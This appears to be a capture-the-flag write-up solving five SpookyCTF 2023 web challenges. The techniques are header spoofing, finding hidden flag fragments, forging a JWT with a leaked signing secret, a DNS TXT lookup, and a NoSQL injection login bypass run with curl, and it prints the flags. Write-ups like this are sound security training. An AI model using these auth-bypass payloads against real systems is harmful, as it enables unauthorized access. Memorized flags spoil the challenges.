# Web Challenges

## Aliens Make Me Wanna Curl

### Description

We are expecting communications from an artificial intelligence device called MU-TH-UR 6000, referred to as mother by the crew. We disabled the login page and implemented a different method of authentication. The username is  `mother`  and the password is  `ovomorph`. To ensure security, only mothers specific browser is allowed.

Author: **Exiden**

[https://spooky-aliens-make-me-wanna-curl-web.chals.io/flag](https://spooky-aliens-make-me-wanna-curl-web.chals.io/flag)

### Solution 

If you visit website it says: `No auth!`. From description we already have auth so lets send basic auth header.

TLDR version: send Authentication token with `username:password` as Base64. 
More about [Basic Auth](https://datatracker.ietf.org/doc/html/rfc7617).

```bash
$ echo -n 'mother:ovomorph' | base64
bW90aGVyOm92b21vcnBo

$ curl -H 'Authorization: Basic bW90aGVyOm92b21vcnBo' https://spooky-aliens-make-me-wanna-curl-web.chals.io/flag
Incorrect Device!
```

For correct device change [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) to given device in description.

```bash
$ curl -H 'Authorization: Basic bW90aGVyOm92b21vcnBo' -H 'User-Agent: MU-TH-UR 6000' https://spooky-aliens-make-me-wanna-curl-web.chals.io/flag
NICC{dOnt_d3pEnD_On_h3AdeRs_4_s3eCu1ty}
```
::: tip Flag
`NICC{dOnt_d3pEnD_On_h3AdeRs_4_s3eCu1ty}`
:::

### Note

Forgot that curl supports authentication Lol...
`-u/--user username:password`

[https://everything.curl.dev/http/auth](https://everything.curl.dev/http/auth)

## Ghosts in the Code

### Description

Some student here spun up a site where people are submitting their stories about all of the spooky stuff on campus!

This site is clearly haunted... or, at the very least, cursed.

[https://niccgetsspooky.xyz](https://niccgetsspooky.xyz/)

_Flag Format: NICC{w0rds_may_c0nta1n_nums_and_chars!?} - but there are no apostrophes, commas, for colons_

Author: **[Cyb0rgSw0rd](https://github.com/AlfredSimpson)**

### Solution

Part 1 (`/js/scary.js`):
```js
function boo(){
    // You found part one:)
    alert("BOO! ahh! You found part one... -> NICC{gh0sts");
}
```

Part 3 (`/js/scary.js`):

```js
function printSpookyArray() {
    const spookyItems = [
		...
        "They shouted that you found the third!: cky_2_s33_b",
        ...
	];
	...
}
```

Part 2 (`/css/bootstraps.css`):

```css
 .flg-txt-pt2{
	 value: '_c@n_b3_tr1';
 }
```

Part 4 (`HTML`):

```html
<img 
	class="oh cemescary" 
	src="../../../../4thPartofyourflag/u7_n0t_1f_y"
	alt="."
/>
```

Part 6 (`HTML`):

```html
<!--the final piece of your puzzle: r3_2_l00k!} -->
```

Part 5 (`Cookies`):

```
flagpart5 | 0u_kn0w_wh3
```

::: tip Flag
`NICC{gh0sts_c@n_b3_tr1cky_2_s33_bu7_n0t_1f_y0u_kn0w_wh3r3_2_l00k!}`
:::

## Jasons Baking Services

### Description

Hey intern! We were able to swipe Jasons application from Github, see if you can find anything useful in the code that will allow you to exploit the real application.

(Be ready to be flash-banged, the web-app is all white!)
 
Author: **Exiden**

Challenge: [https://spooky-jason-bakeshop-web.chals.io/](https://spooky-jason-bakeshop-web.chals.io/)
Source: [jasons-bakeshop-src.zip](https://spooky.ctfd.io/files/ddbffcaedbcb8464977930c7a425b372/jasons-bakeshop-src.zip?token=eyJ1c2VyX2lkIjo5NzUsInRlYW1faWQiOjQ1OSwiZmlsZV9pZCI6MjR9.ZT6GUw.MEFri6nVQBHuYeNn769EnqFzVZU)

### Solution

The vulnariblity is in the given source. You can find `config.env`:

```
SECRET=y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa    
SECRET_REFRESH=y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa
```

`SECRET` is a variable which will be used by application to sign/verify JWT tokens, if this secret is known anyone can forge any kind of tokens.

1\. Register
2\. Login
3\. Copy token
::: details Example
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiV295QWciLCJhdXRob3JpemVkIjp0cnVlLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY5ODU5Nzg3MiwiZXhwIjoxNjk4NTk4MTcyfQ.gpTZ_CkKSbDhn8fP2k-v9iIHFkClLhn0k4cvm2CCWQA
:::
4\. Go to [https://jwt.io](https://jwt.io)
5\. In `VERIFY SIGNATURE` paste the token (and dont check `secret base64 encoded`, because it's not, in most cases it is)

![jasons-baking-services-1](/assets/ctf/spookyctf/jasons-baking-services-1.png)

```powershell
➜ curl -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiV295QWciLCJhdXRob3JpemVkIjp0cnVlLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjk4NTk4MzgxLCJleHAiOjE2OTg1OTg2ODF9.8XxnYQBpTVs9jvLMEM6722AjllRYF-Ew9G35DCxx1U8' https://spooky-jason-bakeshop-web.chals.io/flag
NICC{jWoT_tOkeNs_nEed_saf3_secr3ts}
```
::: tip Flag
`NICC{jWoT_tOkeNs_nEed_saf3_secr3ts}`
:::

## Dig Up Their Bones
  
### Description

That blog seems suspicious and I bet that there's more to it than meets the eye.

See if you can dig up anything about the owner of the site?

You'll know what you're looking for once you find it.

[https://niccgetsspooky.xyz](https://niccgetsspooky.xyz/)

Author: **[Cyb0rgSw0rd](https://github.com/AlfredSimpson)**

### Solution

Since we already checked almost every source file on webserver there must be something else. `Dig` in the challenge name is hint for [dig - DNS lookup utility](https://linux.die.net/man/1/dig)

I used [Dig (DNS lookup) - Google Apps Toolbox](https://toolbox.googleapps.com/apps/dig/) to search every record and TXT record had the flag.
::: warning :warning:
Dont include protocol http[s], you need Domain name itself.
:::

`"SpookyCTF2023FLAG=NICC{gh0sts_ar3_h4rd_2_f1nd}"`
::: tip Flag
`NICC{gh0sts_ar3_h4rd_2_f1nd}`
:::

### Note

On Windows you can use `nslookup`:

```powershell
➜ nslookup -q=TXT niccgetsspooky.xyz
Server:  gateway
Address:  192.168.1.1

Non-authoritative answer:
niccgetsspooky.xyz      text =

        "SpookyCTF2023FLAG=NICC{gh0sts_ar3_h4rd_2_f1nd}"

(root)  ??? unknown type 41 ???
```

## Space Intruders

### Description 

Our space ship was hacked a few days ago. We have made sure to improve our security posture by changing all default credentials. We made sure to stop invalid logins by limiting username input to a length of 3 including an equals, legacy software is a pain but it should be secure now.

Author: **Exiden**

[https://spooky-space-intruder-web.chals.io/](https://spooky-space-intruder-web.chals.io/)

### Solution

**Credit:**

![space-intruders-1](/assets/ctf/spookyctf/space-intruders-1.png)

```powershell
➜ curl 'https://spooky-space-intruder-web.chals.io/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username[$exists]=true&password[$exists]=true'
NICC{d1D_y0U_Kn0W_m0NgOdB1$_w3b$ca13?}
```

[Hacktricks: NoSQL - Basic Authentication Bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)
::: info :information_source:
To my knowledge `$exists` worked because other filters got picked up by WAF.
:::
::: tip Flag
`NICC{d1D_y0U_Kn0W_m0NgOdB1$_w3b$ca13?}`
:::
::: danger :no_entry:
I wanted to include the last challenge in writeup, credit goes to `@partiot.viii`
:::